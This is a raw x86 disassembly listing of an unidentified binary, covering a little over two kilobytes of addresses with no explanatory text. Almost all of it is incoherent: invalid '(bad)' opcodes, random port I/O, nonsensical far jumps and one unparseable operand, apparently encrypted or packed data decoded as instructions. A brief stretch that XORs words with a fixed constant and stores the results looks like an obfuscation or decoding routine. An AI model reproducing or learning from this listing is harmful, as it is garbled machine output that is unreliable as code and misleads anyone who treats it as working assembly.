  407870:	xor    al,0x9
  407872:	out    dx,al
  407873:	dec    esp
  407874:	mov    dl,0x51
  407876:	fidiv  WORD PTR [esi-0x3f838a3c]
  40787c:	and    dl,bh
  40787e:	ret    
  40787f:	push   esi
  407880:	cmp    ax,0xad46
  407884:	mov    edi,0x22050f63
  407889:	(bad)  
  40788a:	and    BYTE PTR [edi-0x664b03cb],al
  407890:	jle    0x4078c9
  407892:	push   0xffffffc4
  407894:	add    ah,BYTE PTR [ebx]
  407896:	ins    DWORD PTR es:[edi],dx
  407897:	lods   eax,DWORD PTR ds:[esi]
  407898:	lods   eax,DWORD PTR ds:[esi]
  407899:	clc    
  40789a:	push   ecx
  40789b:	loope  0x4078c8
  40789d:	lods   eax,DWORD PTR ds:[esi]
  40789e:	mov    eax,0x69f8490d
  4078a3:	test   DWORD PTR [ebx],edi
  4078a5:	int    0xea
  4078a7:	aad    0x3a
  4078a9:	les    esp,FWORD PTR [edi]
  4078ab:	cmp    al,0x4b
  4078ad:	cld    
  4078ae:	dec    ebp
  4078af:	std    
  4078b0:	(bad)  
  4078b1:	ror    bh,1
  4078b3:	xchg   ebx,eax
  4078b4:	int3   
  4078b5:	xor    al,0x74
  4078b7:	popf   
  4078b8:	dec    esi
  4078b9:	mov    esi,DWORD PTR [edx+0x77f9f4e4]
  4078bf:	cdq    
  4078c0:	lahf   
  4078c1:	and    BYTE PTR [esi+0x4d],dh
  4078c4:	ins    DWORD PTR es:[edi],dx
  4078c5:	mov    ecx,0x45101a76
  4078ca:	dec    ebx
  4078cb:	lods   al,BYTE PTR ds:[esi]
  4078cc:	int    0x52
  4078ce:	fs sub eax,0xf38f3402
  4078d4:	cdq    
  4078d5:	mov    eax,ds:0xabf65e31
  4078da:	ret    
  4078db:	icebp  
  4078dc:	mov    esp,0xf14e7b43
  4078e1:	sub    eax,ebp
  4078e3:	dec    ebp
  4078e4:	push   es
  4078e5:	test   eax,0x14762495
  4078ea:	and    ecx,DWORD PTR [ebp+0x6d16c8b9]
  4078f0:	xchg   esp,eax
  4078f1:	lock mov ch,0x2a
  4078f4:	nop
  4078f5:	inc    edi
  4078f6:	xchg   esi,eax
  4078f7:	adc    BYTE PTR ds:0xf47cfaff,0x9a
  4078fe:	push   ecx
  4078ff:	pop    ds
  407900:	xor    BYTE PTR [esi+0xd0f8157],dl
  407906:	lds    eax,FWORD PTR [esp+esi*8]
  407909:	add    DWORD PTR [ecx+0x64],ecx
  40790c:	lods   eax,DWORD PTR ds:[esi]
  40790d:	lds    esi,FWORD PTR [eax+esi*2]
  407910:	lea    edi,[edi]
  407912:	pop    es
  407913:	mov    ecx,0xb8d90034
  407918:	and    dh,dl
  40791a:	xlat   BYTE PTR ds:[ebx]
  40791b:	jae    0x4078c6
  40791d:	mov    edi,0xdfc4b53e
  407922:	dec    ebx
  407923:	fsub   st,st(6)
  407925:	sbb    cl,bh
  407927:	arpl   WORD PTR [esi-0x13],sp
  40792a:	pop    edi
  40792b:	sti    
  40792c:	cmp    al,0xf3
  40792e:	retf   0xa43c
  407931:	fldenv ds:0x64f5f790
  407937:	mov    esi,esi
  407939:	jp     0x40799a
  40793b:	dec    eax
  40793c:	leave  
  40793d:	jge    0x407966
  40793f:	hlt    
  407940:	retf   0xfe88
  407943:	add    eax,0x5ba04c8d
  407948:	dec    esp
  407949:	mov    eax,0x84bd2b02
  40794e:	sub    DWORD PTR [ebp-0x38],ebx
  407951:	(bad)
  407955:	jmp    0x661c:0xe4967eb8
  40795c:	out    dx,eax
  40795d:	add    ebx,DWORD PTR ds:0x4fc3557f
  407963:	test   eax,0x31b54b35
  407968:	add    esi,edx
  40796a:	pop    ecx
  40796b:	ret    0x1874
  40796e:	xchg   ecx,eax
  40796f:	in     eax,dx
  407970:	pop    eax
  407971:	fmul   DWORD PTR [edx-0x6f]
  407974:	sub    esp,ebp
  407976:	lods   eax,DWORD PTR ds:[esi]
  407977:	fcomp  st(5)
  407979:	out    0x6d,al
  40797b:	retf   0xd8ad
  40797e:	xor    bl,ch
  407980:	(bad)  
  407981:	xlat   BYTE PTR ds:[ebx]
  407982:	jecxz  0x4079a8
  407984:	push   esp
  407985:	xchg   edx,eax
  407986:	out    0x1e,eax
  407988:	and    al,0xa5
  40798a:	movntps XMMWORD PTR gs:[eax+0xf],xmm6
  40798f:	pop    esp
  407990:	pop    ebp
  407991:	pop    esp
  407992:	call   0x9d211700
  407997:	fs inc edi
  407999:	icebp  
  40799a:	and    DWORD PTR [edi-0x5fb3abf8],esi
  4079a0:	fnsave [eax-0x5a]
  4079a3:	cmp    eax,0x704b1972
  4079a8:	xor    eax,0xfc00881b
  4079ad:	or     DWORD PTR [edi-0x2241801e],0xc
  4079b4:	(bad)  
  4079b5:	pop    ebx
  4079b6:	out    dx,al
  4079b7:	out    0xe7,al
  4079b9:	ror    ah,0x66
  4079bc:	shl    BYTE PTR [ebx-0x1b739035],1
  4079c2:	jmp    0xc93f:0xf47ef3e5
  4079c9:	in     eax,dx
  4079ca:	mov    edi,0x5b3b359b
  4079cf:	xor    eax,eax
  4079d1:	ins    DWORD PTR es:[edi],dx
  4079d2:	sbb    ecx,DWORD PTR [ecx-0x541bda1]
  4079d8:	shl    BYTE PTR [ebp-0x134d89ba],1
  4079de:	inc    edx
  4079df:	std    
  4079e0:	dec    eax
  4079e1:	mov    eax,ds:0x900aaf51
  4079e6:	push   esp
  4079e7:	cwde   
  4079e8:	adc    dl,ch
  4079ea:	shr    DWORD PTR [edx-0xb],cl
  4079ed:	jl     0x4079e3
  4079ef:	jmp    0x4079cb
  4079f1:	pop    ebp
  4079f2:	shl    ebp,1
  4079f4:	mov    bl,0x9f
  4079f6:	hlt    
  4079f7:	pusha  
  4079f8:	push   esp
  4079f9:	xchg   ecx,eax
  4079fa:	sahf   
  4079fb:	in     eax,0x1c
  4079fd:	in     eax,dx
  4079fe:	jno    0x4079ec
  407a00:	test   eax,0xcb35ec6e
  407a05:	scas   al,BYTE PTR es:[edi]
  407a06:	push   eax
  407a07:	(bad)  
  407a08:	push   ecx
  407a09:	mov    esi,DWORD PTR [edx]
  407a0b:	cmp    dh,BYTE PTR [edx-0x353180ee]
  407a11:	and    edi,DWORD PTR [eax-0xf0446ca]
  407a17:	(bad)  
  407a18:	or     ah,dh
  407a1a:	mov    eax,ds:0xe10450cc
  407a1f:	dec    edx
  407a20:	int    0x28
  407a22:	sub    bh,ch
  407a24:	jp     0x407a38
  407a26:	fldcw  WORD PTR [ebp+0x3ec7655d]
  407a2c:	dec    ebx
  407a2d:	enter  0x367f,0xa8
  407a31:	nop
  407a32:	imul   ebx,DWORD PTR [edi-0x34],0x8b20ade6
  407a39:	jl     0x407a30
  407a3b:	shl    DWORD PTR [ebp+edx*8-0x66e12c],0xd5
  407a43:	and    BYTE PTR [edx+0x5],al
  407a46:	sahf   
  407a47:	jno    0x4079f4
  407a49:	or     eax,0xdaf19338
  407a4e:	bound  eax,QWORD PTR [ecx+0x2756c587]
  407a54:	adc    al,0x23
  407a56:	mov    BYTE PTR [ecx],dl
  407a58:	add    edx,eax
  407a5a:	fiadd  DWORD PTR [edx+esi*1]
  407a5d:	lods   al,BYTE PTR ds:[esi]
  407a5e:	fistp  QWORD PTR [eax]
  407a60:	not    cl
  407a62:	jecxz  0x407a84
  407a64:	xlat   BYTE PTR es:[ebx]
  407a66:	jmp    0x8b1dd1a2
  407a6b:	outs   dx,BYTE PTR ds:[esi]
  407a6c:	and    dl,BYTE PTR [edx-0x2fd8bcd0]
  407a72:	out    dx,al
  407a73:	bound  ebp,QWORD PTR [edi-0x16]
  407a76:	mov    bl,0xa9
  407a78:	popf   
  407a79:	cs mov bl,0x2e
  407a7c:	xor    edx,DWORD PTR [edi+0x5134ea5f]
  407a82:	pop    edi
  407a83:	cdq    
  407a84:	add    ebp,DWORD PTR [ecx-0x7e8554bd]
  407a8a:	fcomp  QWORD PTR [eax]
  407a8c:	push   es
  407a8d:	add    ax,di
  407a90:	movzx  eax,ax
  407a93:	mov    DWORD PTR [ebp-0x14],eax
  407a96:	mov    eax,DWORD PTR [ebp+0x8]
  407a99:	movzx  eax,WORD PTR [eax+edx*4]
  407a9d:	xor    eax,0x8a36
  407aa2:	add    eax,edi
  407aa4:	mov    edi,DWORD PTR [ebp-0x14]
  407aa7:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407aab:	mov    eax,DWORD PTR [ebp-0xc]
  407aae:	inc    edx
  407aaf:	jmp    0x407db8
  407ab4:	ror    ebp,0xd6
  407ab7:	retf   
  407ab8:	fcmove st,st(3)
  407aba:	rcl    ebp,1
  407abc:	adc    edx,DWORD PTR [esi+0x3c]
  407abf:	xchg   esp,eax
  407ac0:	out    0xea,al
  407ac2:	dec    DWORD PTR [esp+ebx*4-0x25]
  407ac6:	js     0x407b40
  407ac8:	fs jle 0x407b43
  407acb:	js     0x407b17
  407acd:	je     0x407a97
  407acf:	enter  0x8daf,0xe3
  407ad3:	out    0x6c,eax
  407ad5:	cmp    DWORD PTR [ecx+0x1b],ebp
  407ad8:	xor    al,0xf2
  407ada:	ficomp DWORD PTR fs:[ebx]
  407add:	pop    ebx
  407ade:	sti    
  407adf:	mov    dl,0x37
  407ae1:	sub    ebx,DWORD PTR [edx+0x96db8a8]
  407ae7:	xchg   DWORD PTR [ecx],ecx
  407ae9:	inc    edx
  407aea:	xchg   ebx,eax
  407aeb:	hlt    
  407aec:	cld    
  407aed:	and    BYTE PTR [edx+0x12],0x7
  407af1:	call   0xa5a66f65
  407af6:	mov    eax,0xa812373f
  407afb:	cmp    ebp,DWORD PTR ds:0x888280cc
  407b01:	cwde   
  407b02:	mov    edi,0x736adfce
  407b07:	push   esi
  407b08:	mov    ebx,0x1ddb7090
  407b0d:	mov    WORD PTR [eax-0x7a7fa389],gs
  407b13:	jbe    0x407ad8
  407b15:	and    BYTE PTR [edi-0x4f79541d],0x97
  407b1c:	mov    dh,0x5a
  407b1e:	out    dx,eax
  407b1f:	push   ebx
  407b20:	fstp   QWORD PTR [esi]
  407b22:	arpl   WORD PTR ss:[ebx-0x63],ax
  407b26:	inc    ebx
  407b27:	data16 jg 0x407ab9
  407b2a:	xchg   edi,eax
  407b2b:	adc    ah,BYTE PTR [edx-0x717dead8]
  407b31:	pop    ebx
  407b32:	mov    BYTE PTR [edx-0x7e],ch
  407b35:	nop
  407b36:	mov    al,BYTE PTR [edi]
  407b38:	pusha  
  407b39:	mov    cl,0x96
  407b3b:	mov    BYTE PTR [edx-0x3a],ah
  407b3e:	pop    ds
  407b3f:	add    eax,edx
  407b41:	mov    esp,0x1c274a1c
  407b46:	inc    ebx
  407b47:	in     al,0xe
  407b49:	jl     0x407b89
  407b4b:	(bad)  
  407b4d:	(bad)  
  407b4e:	enter  0x4824,0x5d
  407b52:	xor    ebp,eax
  407b54:	popa   
  407b55:	jge    0x407b12
  407b57:	in     al,dx
  407b58:	es xchg esp,eax
  407b5a:	or     al,dl
  407b5c:	aas    
  407b5d:	ins    DWORD PTR es:[edi],dx
  407b5e:	mov    eax,0xc6a7d9ef
  407b63:	pop    ss
  407b64:	xchg   DWORD PTR [ebx-0xe07573d],ebp
  407b6a:	shr    BYTE PTR [ecx+0x2cd91e42],1
  407b70:	dec    ebx
  407b71:	cld    
  407b72:	mov    eax,0x77ba8255
  407b77:	mov    al,ds:0x7bbbea74
  407b7c:	adc    dh,BYTE PTR ds:0x12a70c57
  407b82:	inc    edi
  407b83:	adc    dh,cl
  407b85:	test   DWORD PTR [ecx],esp
  407b87:	dec    ebx
  407b88:	dec    esi
  407b89:	je     0x407b4c
  407b8b:	dec    ebx
  407b8c:	out    dx,eax
  407b8d:	in     eax,dx
  407b8e:	icebp  
  407b8f:	fwait
  407b90:	loopne 0x407bd3
  407b92:	ret    0x3507
  407b95:	shl    ebp,1
  407b97:	push   edi
  407b98:	retf   
  407b99:	daa    
  407b9a:	mov    ds:0xe71e5ab8,al
  407b9f:	imul   ecx,DWORD PTR [ebp+0x17],0x97154beb
  407ba6:	out    dx,al
  407ba7:	dec    eax
  407ba8:	jmp    DWORD PTR [eax]
  407baa:	loop   0x407c23
  407bac:	jp     0x407b6f
  407bae:	icebp  
  407baf:	xchg   edx,eax
  407bb0:	test   eax,0x6c815210
  407bb5:	iret   
  407bb6:	sub    cl,BYTE PTR [eax+edx*4]
  407bb9:	xchg   esi,eax
  407bba:	cmp    eax,0x70641294
  407bbf:	enter  0x8b63,0xec
  407bc3:	push   es
  407bc4:	sbb    al,0xb5
  407bc6:	pop    ebp
  407bc7:	push   ecx
  407bc8:	adc    DWORD PTR [edx+eiz*1+0x48f47097],eax
  407bcf:	(bad)  
  407bd0:	xor    al,0x27
  407bd2:	or     BYTE PTR [ecx-0x13],ah
  407bd5:	mov    gs:0x77f4f019,eax
  407bdb:	cmp    bh,ah
  407bdd:	add    ebp,eax
  407bdf:	into   
  407be0:	je     0x407bd9
  407be2:	repnz sbb edx,DWORD PTR [ebp+0x11e5aec0]
  407be9:	fcomi  st,st(4)
  407beb:	(bad)  
  407bed:	imul   edx,DWORD PTR [ebp+0xa],0x50
  407bf1:	imul   esp,DWORD PTR [edx-0x14],0xffffffa6
  407bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bf6:	jne    0x407bee
  407bf8:	out    dx,al
  407bf9:	fidiv  DWORD PTR [edi+0x48]
  407bfc:	(bad)  
  407bfd:	push   edi
  407bfe:	test   al,0xc6
  407c00:	sub    BYTE PTR ds:0x952d34cd,0x80
  407c07:	push   ecx
  407c08:	sbb    BYTE PTR [ebp+0x61],dl
  407c0b:	inc    ebx
  407c0c:	call   0xc3e0:0xe810f218
  407c13:	cmp    bh,BYTE PTR [ebp+0x241e9811]
  407c19:	mov    ebp,0x568c4949
  407c1e:	sti    
  407c1f:	dec    ebp
  407c20:	add    BYTE PTR [ebp+edi*2+0x7654089d],ah
  407c27:	mov    ecx,0x43a59c64
  407c2c:	iret   
  407c2d:	mov    esp,0x34584f08
  407c32:	not    DWORD PTR [edi+0x3d8c9aef]
  407c38:	push   esi
  407c39:	mov    esi,0xfc1fa4cd
  407c3e:	in     eax,dx
  407c3f:	xchg   edi,eax
  407c40:	mov    edi,0xc5181055
  407c45:	scas   al,BYTE PTR es:[edi]
  407c46:	or     dh,BYTE PTR [ecx-0x58810d1b]
  407c4c:	fild   WORD PTR [eax-0x1]
  407c4f:	adc    DWORD PTR [ebx],0x9229be70
  407c55:	push   ds
  407c56:	enter  0x5015,0xad
  407c5a:	sbb    al,0xde
  407c5c:	xlat   BYTE PTR ds:[ebx]
  407c5d:	sti    
  407c5e:	adc    eax,0x2be6418a
  407c63:	ins    DWORD PTR es:[edi],dx
  407c64:	sbb    al,0x51
  407c66:	push   eax
  407c67:	xor    ah,BYTE PTR [ecx+eiz*1+0x687128e9]
  407c6e:	push   ecx
  407c6f:	adc    esp,edi
  407c71:	lods   al,BYTE PTR ds:[esi]
  407c72:	dec    edx
  407c73:	dec    edx
  407c74:	cmp    al,0x5
  407c76:	sub    DWORD PTR [edi+ebp*4-0x72324766],eax
  407c7d:	or     bl,dh
  407c7f:	in     eax,dx
  407c80:	xor    ebx,DWORD PTR [ecx-0x1f5d1c75]
  407c86:	loop   0x407c8a
  407c88:	in     eax,0x3a
  407c8a:	outs   dx,DWORD PTR ds:[esi]
  407c8b:	gs dec ebx
  407c8d:	in     eax,0x57
  407c8f:	ss jecxz 0x407c1d
  407c92:	sbb    DWORD PTR [ebx-0x6d574ad4],ecx
  407c98:	sahf   
  407c99:	xor    bl,BYTE PTR [edx]
  407c9b:	aaa    
  407c9c:	xor    dl,BYTE PTR [edx+ebx*8+0x20]
  407ca0:	cdq    
  407ca1:	sbb    BYTE PTR [ecx-0xad0e70c],0x2a
  407ca8:	inc    ebx
  407ca9:	pop    edi
  407caa:	dec    ebx
  407cab:	cmp    cl,BYTE PTR [edi+esi*2-0x7f3adba5]
  407cb2:	xor    al,0x47
  407cb4:	or     al,0x51
  407cb6:	pusha  
  407cb7:	xchg   edi,eax
  407cb8:	jo     0x407c94
  407cba:	gs jns 0x407d09
  407cbd:	pop    ecx
  407cbe:	cmc    
  407cbf:	cmp    al,0x31
  407cc1:	add    ecx,DWORD PTR [edi+0x38]
  407cc4:	fistp  DWORD PTR [ecx]
  407cc6:	shr    BYTE PTR [ebx],cl
  407cc8:	rcl    DWORD PTR [edi+0x26],cl
  407ccb:	sahf   
  407ccc:	sbb    BYTE PTR [edi+ecx*2-0x20],0x5
  407cd1:	aam    0xae
  407cd3:	test   al,0x87
  407cd5:	cmp    dl,0x8a
  407cd8:	sbb    DWORD PTR [ebx+0x7f],edx
  407cdb:	jbe    0x407ced
  407cdd:	cmp    bl,ah
  407cdf:	jns    0x407d37
  407ce1:	push   esi
  407ce2:	jg     0x407cb5
  407ce4:	sub    al,0xb2
  407ce6:	pop    ecx
  407ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ce8:	lods   al,BYTE PTR ds:[esi]
  407ce9:	adc    esi,ebx
  407ceb:	dec    ecx
  407cec:	mov    edx,0xdddaaeb0
  407cf1:	push   ebx
  407cf2:	(bad)  
  407cf4:	add    BYTE PTR [edi+0x5a5f794f],bh
  407cfa:	pop    ecx
  407cfb:	pop    es
  407cfc:	es leave 
  407cfe:	mov    eax,ds:0xc2be7f70
  407d03:	xor    al,0xf4
  407d05:	push   ebx
  407d06:	adc    ch,dl
  407d08:	or     al,0x7f
  407d0a:	push   ebx
  407d0b:	aaa    
  407d0c:	pop    ebx
  407d0d:	and    ecx,DWORD PTR [esi+0x15]
  407d10:	repz pop esi
  407d12:	outs   dx,DWORD PTR ds:[esi]
  407d13:	sbb    bl,BYTE PTR [ebp-0x78]
  407d16:	int3   
  407d17:	test   al,0x63
  407d19:	ret    0x78ac
  407d1c:	call   0x67353980
  407d21:	mov    eax,0x669dd7f1
  407d26:	and    ebx,DWORD PTR [edx]
  407d28:	adc    al,bl
  407d2a:	adc    al,0x95
  407d2c:	es pop eax
  407d2e:	xor    BYTE PTR [esi-0x26],dh
  407d31:	neg    ah
  407d33:	dec    DWORD PTR [esi-0x3c]
  407d36:	ds inc edi
  407d38:	enter  0x3056,0x3c
  407d3c:	pop    esp
  407d3d:	push   edi
  407d3e:	(bad)  
  407d3f:	lds    eax,FWORD PTR [ebp-0x18]
  407d42:	push   es
  407d43:	xchg   edi,eax
  407d44:	sub    eax,0x6c78db4b
  407d49:	push   esp
  407d4a:	in     eax,0xd9
  407d4c:	mov    al,0xd0
  407d4e:	into   
  407d4f:	jmp    0xba63efc5
  407d54:	mov    ecx,DWORD PTR [edx+0x513f4870]
  407d5a:	lods   al,BYTE PTR ds:[esi]
  407d5b:	and    bl,BYTE PTR [esi+esi*8+0x7a]
  407d5f:	jo     0x407db2
  407d61:	stc    
  407d62:	and    eax,DWORD PTR [esi+edx*2]
  407d65:	in     al,0xe2
  407d67:	jne    0x407dcf
  407d69:	xor    BYTE PTR [edi-0x13],dh
  407d6c:	jbe    0x407d5e
  407d6e:	dec    ecx
  407d6f:	sbb    dh,BYTE PTR ds:0xa7b0f5f7
  407d75:	mov    ds:0x50d91e8,al
  407d7a:	dec    ebp
  407d7b:	xor    ebx,DWORD PTR [edi+edi*8]
  407d7e:	rcl    dl,0xc7
  407d81:	jmp    0x407d9f
  407d83:	rol    BYTE PTR [edi+0x66],0x15
  407d87:	mov    eax,ds:0x93e8b3f2
  407d8c:	aas    
  407d8d:	cmc    
  407d8e:	dec    edx
  407d8f:	sar    BYTE PTR [ecx-0x4b],0xc
  407d93:	rcr    BYTE PTR [edi+ecx*8-0x7b],0xfc
  407d98:	pop    ds
  407d99:	ss push esi
  407d9b:	xchg   ebx,eax
  407d9c:	jb     0x407ddb
  407d9e:	xchg   ecx,eax
  407d9f:	out    0x9d,eax
  407da1:	inc    edx
  407da2:	imul   esi,DWORD PTR [eax+0x19],0xffffffdb
  407da6:	xchg   ebp,eax
  407da7:	adc    DWORD PTR [esi+edi*4+0xa],edi
  407dab:	iret   
  407dac:	ss mov ebx,0xa0e42a38
  407db2:	fcmove st,st(7)
  407db4:	retf   
  407db5:	cmp    esi,edx
  407db7:	mov    edx,0x850fd03b
  407dbc:	mov    dl,0xf9
  407dbe:	(bad)  
  407dbf:	call   FWORD PTR [edi+0x5b]
  407dc2:	mov    eax,DWORD PTR [ebp-0x8]
  407dc5:	mov    edx,DWORD PTR [ebp+0x10]
  407dc8:	jmp    0x4080d1
  407dcd:	retf   0xd73f
  407dd0:	ret    0xdad9
  407dd3:	fld    st(7)
  407dd5:	add    BYTE PTR [eax+0x7c],bl
  407dd8:	fmul   st,st(3)
  407dda:	repnz cmp ah,BYTE PTR [esi-0x78]
  407dde:	fdivr  DWORD PTR [eax+0x78]
  407de1:	fs jle 0x407e5c
  407de4:	js     0x407e2b
  407de6:	loopne 0x407dc5
  407de8:	inc    ebx
  407de9:	sub    eax,0xac4f7a20
  407dee:	jne    0x407e35
  407df0:	or     eax,0x4db1e0f9
  407df5:	ds sub eax,esp
  407df8:	ficomp WORD PTR [ecx]
  407dfa:	sahf   
  407dfb:	push   cs
  407dfc:	in     al,dx
  407dfd:	int    0xe6
  407dff:	cdq    
  407e00:	mov    esp,0xbd9c5805
  407e05:	pop    eax
  407e06:	dec    esi
  407e07:	cmp    BYTE PTR [edi],dl
  407e09:	sub    cl,BYTE PTR [ebx]
  407e0b:	xor    esp,DWORD PTR [eax+esi*4-0x67]
  407e0f:	xchg   edx,eax
  407e10:	xlat   BYTE PTR ds:[ebx]
  407e11:	cmp    BYTE PTR [ecx],ah
  407e13:	lahf   
  407e14:	push   0x2a
  407e16:	or     ch,BYTE PTR [esi+ebp*1-0x73525e33]
  407e1d:	(bad)  
  407e1e:	sub    edi,DWORD PTR [ebx]
  407e20:	imul   esp,DWORD PTR [eax-0x5f],0x76
  407e24:	jo     0x407e14
  407e26:	or     DWORD PTR [ecx],ebp
  407e28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e29:	mov    al,0x5b
  407e2b:	or     eax,0xccf914b6
  407e30:	pop    esp
  407e31:	pop    eax
  407e32:	test   eax,0x78f0648c
  407e37:	pop    esi
  407e39:	cmp    DWORD PTR [edx-0x27],edi
  407e3c:	sahf   
  407e3d:	xchg   ebp,eax
  407e3e:	cmp    BYTE PTR ss:[ecx-0x4d1221e0],al
  407e45:	(bad)  
  407e47:	rol    dh,cl
  407e49:	cmp    BYTE PTR [eax-0x246be16e],0x93
  407e50:	cmp    ch,bl
  407e52:	mov    edi,0x57cf00ba
  407e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e58:	dec    ecx
  407e59:	sbb    ch,dl
  407e5b:	daa    
  407e5c:	out    dx,al
  407e5d:	inc    ebp
  407e5e:	addr16 loopne 0x407e2b
  407e61:	xor    BYTE PTR [ecx],ch
  407e63:	jmp    0x2562:0x443e16c7
  407e6a:	pushf  
  407e6b:	cmp    BYTE PTR [ebx-0x386a9083],cl
  407e71:	retf   
  407e72:	inc    ebx
  407e73:	shl    BYTE PTR [esi+0x49789499],0x57
  407e7a:	pop    es
  407e7b:	sub    al,BYTE PTR [ecx]
  407e7d:	out    dx,eax
  407e7e:	(bad)  
  407e7f:	cs xchg esp,eax
  407e81:	fbld   TBYTE PTR [esi+edx*2-0x65]
  407e85:	pop    esp
  407e86:	int    0xd8
  407e88:	jno    0x407e12
  407e8a:	ins    BYTE PTR es:[edi],dx
  407e8b:	fcomp  QWORD PTR [eax+0x53dfada5]
  407e91:	retf   0xb7af
  407e94:	lods   eax,DWORD PTR ds:[esi]
  407e95:	je     0x407ed8
  407e97:	out    0x1b,eax
  407e99:	xor    BYTE PTR [ebp+0x4781eba6],ch
  407e9f:	sbb    cl,BYTE PTR [edx-0x3bb1acce]
  407ea5:	jmp    0x407e4b
  407ea7:	jecxz  0x407e8d
  407ea9:	arpl   WORD PTR [eax],sp
  407eab:	mov    eax,0x3541afc6
  407eb0:	adc    al,0xd3
  407eb2:	daa    
  407eb3:	mov    ds:0xa205703b,eax
  407eb8:	cmp    eax,0x40fb24ec
  407ebd:	mov    eax,ds:0xfdbed0d8
  407ec2:	ja     0x407f1b
  407ec4:	push   ebp
  407ec5:	sbb    BYTE PTR [edx+ecx*1-0x3929888f],ah
  407ecc:	xchg   edx,eax
  407ecd:	xchg   BYTE PTR [ebx],bh
  407ecf:	in     al,dx
  407ed0:	imul   esi,DWORD PTR [edi],0x34
  407ed3:	fs cmp al,0xd3
  407ed6:	mov    bl,0x33
  407ed8:	ins    BYTE PTR es:[edi],dx
  407ed9:	ja     0x407e7c
  407edb:	test   al,0x3c
  407edd:	scas   al,BYTE PTR es:[edi]
  407ede:	sbb    bh,bh
  407ee0:	mov    dl,0x62
  407ee2:	add    DWORD PTR [edx+0x8],0xcdc2743a
  407ee9:	or     BYTE PTR [ecx],dh
  407eeb:	push   eax
  407eec:	in     eax,0xb9
  407eee:	mov    ebp,DWORD PTR [eax-0x74d94944]
  407ef4:	cmc    
  407ef5:	and    al,0xd4
  407ef7:	and    eax,0xb894c40d
  407efc:	cmp    eax,0xd71ba784
  407f01:	arpl   di,cx
  407f03:	fnstsw WORD PTR [esi]
  407f05:	jb     0x407ef8
  407f07:	sub    eax,0x2d2b781a
  407f0c:	popf   
  407f0d:	out    dx,al
  407f0e:	inc    ebp
  407f0f:	shl    eax,1
  407f11:	hlt    
  407f12:	orps   xmm7,XMMWORD PTR [eax+0x29]
  407f16:	jns    0x407ebc
  407f18:	ds fwait
  407f1a:	scas   eax,DWORD PTR es:[edi]
  407f1b:	sub    eax,0x888d6a
  407f20:	lea    ebp,[edx+0x73]
  407f23:	sub    eax,0xad79298a
  407f28:	in     eax,dx
  407f29:	cmp    DWORD PTR [ebx+0xea86efd],0x4149ed89
  407f33:	test   eax,0x7023aa7a
  407f38:	pop    edi
  407f39:	es xor ah,dl
  407f3c:	xchg   esi,eax
  407f3d:	dec    esi
  407f3e:	sti    
  407f3f:	dec    ecx
  407f40:	xchg   edi,eax
  407f41:	popa   
  407f42:	xor    eax,0xaefd55f8
  407f47:	aas    
  407f48:	adc    ch,dh
  407f4a:	adc    BYTE PTR [edx+0x14],cl
  407f4d:	imul   esp,DWORD PTR [eax+0x4d],0x16
  407f51:	paddsb mm0,QWORD PTR [ebx]
  407f54:	outs   dx,BYTE PTR ds:[esi]
  407f55:	ins    BYTE PTR es:[edi],dx
  407f56:	call   0x5464:0xf0c04727
  407f5d:	cmp    ch,BYTE PTR [eax+0x37]
  407f60:	cmp    eax,0xc6fa9f41
  407f65:	xchg   ebp,eax
  407f66:	jb     0x407fa5
  407f68:	xchg   esi,eax
  407f69:	add    DWORD PTR [esi+0x35],edi
  407f6c:	in     eax,0xaa
  407f6e:	mov    ebp,0x637ba26c
  407f73:	xor    BYTE PTR [esi-0x21],ah
  407f76:	fsub   st(4),st
  407f78:	add    DWORD PTR [eax-0x6a],0x866d6dd2
  407f7f:	mov    BYTE PTR [edi],cl
  407f81:	ss (bad) 
  407f83:	shr    BYTE PTR [ebp-0x41f70fbb],1
  407f89:	push   ecx
  407f8a:	cld    
  407f8b:	mov    ebp,0xb8429821
  407f90:	fwait
  407f91:	xchg   edi,eax
  407f92:	dec    esi
  407f93:	adc    eax,0x8e38a274
  407f98:	jae    0x407f3a
  407f9a:	call   0xd7cd:0xcbd4f2eb
  407fa1:	aas    
  407fa2:	popa   
  407fa3:	push   cs
  407fa4:	pop    eax
  407fa5:	push   ecx
  407fa6:	mov    ?,esp
  407fa8:	pop    es
  407fa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fab:	dec    ecx
  407fac:	xor    al,0xc4
  407fae:	ins    BYTE PTR es:[edi],dx
  407faf:	cmp    eax,0xf2c144c8
  407fb4:	lock ficom WORD PTR [esi]
  407fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fb8:	cs xor al,0x1e
  407fbb:	mov    dl,0xb0
  407fbd:	xchg   ecx,eax
  407fbe:	cli    
  407fbf:	rcr    BYTE PTR [edi+0x4f],0xf6
  407fc3:	test   DWORD PTR [edx+0x5636df49],eax
  407fc9:	push   0xffffffaa
  407fcb:	lahf   
  407fcc:	xor    dl,ah
  407fce:	push   eax
  407fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd0:	imul   esp,DWORD PTR ss:[ecx+0x4f3a9c37],0x1b73af78
  407fdb:	mov    WORD PTR [ebp+0x2f],es
  407fde:	jl     0x407f8c
  407fe0:	dec    esi
  407fe1:	test   eax,0x7b9710df
  407fe6:	fist   WORD PTR [esi-0xa43b656]
  407fec:	and    al,0xa3
  407fee:	xchg   edi,eax
  407fef:	fwait
  407ff0:	pushf  
  407ff1:	out    0xca,al
  407ff3:	and    al,0x8e
  407ff5:	xchg   esp,eax
  407ff6:	inc    ebp
  407ff7:	mov    ebp,0x59e4a39b
  407ffc:	or     cl,ch
  407ffe:	jmp    FWORD PTR [edx+0xf418ad7]
  408004:	in     al,0xfb
  408006:	dec    edx
  408007:	xor    BYTE PTR [ebp-0x23],0x84
  40800b:	mov    eax,ds:0xb9183014
  408010:	pop    esp
  408011:	dec    ebx
  408012:	lea    ebp,[ebp-0x65cdcc7f]
  408018:	clc    
  408019:	shl    DWORD PTR [eax-0x2bab6425],1
  40801f:	mov    ecx,0x59c8babd
  408024:	sub    eax,0x49ceec35
  408029:	repnz sbb WORD PTR [ebx+0x79e5e0cc],si
  408031:	mov    ebp,0xba2c233a
  408036:	mov    ebx,0xe66c48a0
  40803b:	add    al,0x53
  40803d:	rcr    BYTE PTR [eax*1+0x27454ab5],cl
